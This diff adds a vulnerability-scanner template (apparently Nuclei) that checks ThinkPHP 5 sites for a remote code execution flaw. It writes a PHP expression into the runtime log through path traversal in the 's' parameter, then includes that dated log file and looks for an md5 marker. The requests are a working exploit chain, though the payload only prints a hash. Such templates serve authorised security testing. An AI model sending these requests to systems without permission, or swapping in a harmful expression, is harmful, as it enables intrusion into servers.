@@ -1,0 +1,39 @@
+id: poc-local-thinkphp-v5-showid-log-rce
+
+info:
+  name: thinkphp5-showid-日志文件写入-rce
+  author: capiton
+  severity: critical
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  year: '{{date_time("%Y")}}'
+  month: '{{date_time("%M")}}'
+  today: '{{date_time("%D")}}'
+  yesterday: '{{to_number(today) - 1 }}'
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |+
+        GET /index.php?s=my-show-id-\x5C..\x5CTpl\x5C8edy\x5CHome\x5Cmy_1{~var_dump(md5({{randInt}}))}] HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /index.php?s=my-show-id-\x5C..\x5CRuntime\x5CLogs\x5C{{year}}_{{month}}_{{today}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /index.php?s=my-show-id-\x5C..\x5CRuntime\x5CLogs\x5C{{year}}_{{month}}_0{{today}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
+
